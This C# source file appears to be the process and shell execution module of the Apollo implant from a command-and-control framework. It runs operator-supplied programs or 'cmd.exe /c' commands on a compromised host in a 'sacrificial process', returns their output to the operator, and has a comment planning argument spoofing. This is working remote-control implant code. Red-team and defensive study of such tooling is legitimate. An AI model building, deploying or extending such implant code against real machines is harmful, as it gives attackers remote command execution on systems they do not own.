#define COMMAND_NAME_UPPER

#if DEBUG
#undef RUN
#undef SHELL
#define SHELL
#define RUN
#endif

#if RUN || SHELL

using System;
using System.Linq;
using Apollo.Jobs;
using System.Collections.Generic;
using System.Threading;
using Apollo.Tasks;
using static Utils.StringUtils;

namespace Apollo.CommandModules
{
    public class Process
    {
        /// <summary>
        /// Run an arbitrary executable with command line arguments or
        /// run a shell command via cmd.exe /c. 
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. If the task is "shell" then
        /// the application to launch will be cmd.exe with job.Task.parameters
        /// specifying the shell command to execute. Otherwise, the application 
        /// to launch is given by the first space-delimited argument in 
        /// job.Task.parameters.
        /// </param>
        /// <param name="implant">Agent associated with this job.Task.</param>
        public static void Execute(Job job, Agent implant)
        {
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            string applicationName;
            string commandLine = ""; // Probably can implement some argument spoofing stuff down the line
            string cmdString;
            ApolloTaskResponse response;
            string originalParams = job.Task.parameters.Trim();
            string[] split = SplitCommandLine(job.Task.parameters.Trim());
            //applicationName = split[0];

            if (job.Task.command == "shell")
            {
                applicationName = "cmd.exe";
                commandLine += String.Format("/c \"{0}\"", split[0]);
            } else
            {
                applicationName = split[0];
            }

            if (split.Length > 1)
            {
                int firstIndex = originalParams.IndexOf(split[0]);
                string subsequentArgs = "";
                switch (firstIndex)
                {
                    case 0:
                        subsequentArgs = originalParams.Substring(split[0].Length).Trim();
                        break;
                    case 1:
                        if (originalParams[0] == '"' && originalParams[split[0].Length+1] != '"')
                        {
                            job.SetError($"Command line is of unexpected format. Expected {split[0]} to be encapsulated in quotes in the original command, but got {originalParams}");
                            return;
                        }
                        else if (originalParams[0] == '\'' && originalParams[split[0].Length+1] != '\'')
                        {
                            job.SetError($"Command line is of unexpected format. Expected {split[0]} to be encapsulated in quotes in the original command, but got {originalParams}");
                            return;
                        } else
                        {
                            subsequentArgs = originalParams.Substring(split[0].Length + 2).Trim();
                        }
                        break;
                    default:
                        job.SetError($"Invalid command line format. Expected first command line argument to be program or program enclosed in quotes, but instead got {split[0]}");
                        return;
                }
                if (commandLine != "")
                {
                    commandLine += String.Format(" {0}", subsequentArgs);
                }
                else
                {
                    commandLine = subsequentArgs;
                }
                cmdString = String.Format("{0} {1}", applicationName, commandLine);
            } else if (commandLine != "")
            {
                cmdString = String.Format("{0} {1}", applicationName, commandLine);
            } else
            {
                cmdString = applicationName;
            }

            try
            {
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(applicationName, commandLine);

                sacrificialProcess.OutputDataReceived = delegate (string data)
                {
                    job.AddOutput(data);
                };

                sacrificialProcess.ErrorDataReceived = delegate (string data)
                {
                    job.AddOutput(data);
                };
                if (sacrificialProcess.Start())
                {
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    sacrificialProcess.WaitForExit();
                } else
                {
                    job.SetError($"Failed to start sacrificial process. GetLastError(): {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            } catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in executing \"{0}\" (PID: {1}). Reason: {2}", cmdString, sacrificialProcess.PID, ex.Message));
                } else
                {
                    job.SetError(String.Format("Error in executing \"{0}\". Reason: {1}", cmdString, ex.Message));
                }
            }

            if (sacrificialProcess != null)
            {
                if (sacrificialProcess.ExitCode == 0 && sacrificialProcess.PID != 0)
                {
                    job.SetComplete(String.Format("Process executed \"{0}\" with PID {1} and returned exit code {2}", cmdString, sacrificialProcess.PID, sacrificialProcess.ExitCode));
                } else
                {
                    job.SetError($"Unknown error. Exit code: {sacrificialProcess.ExitCode} from PID: {sacrificialProcess.PID}");
                }
            }
        }
    }
}
#endif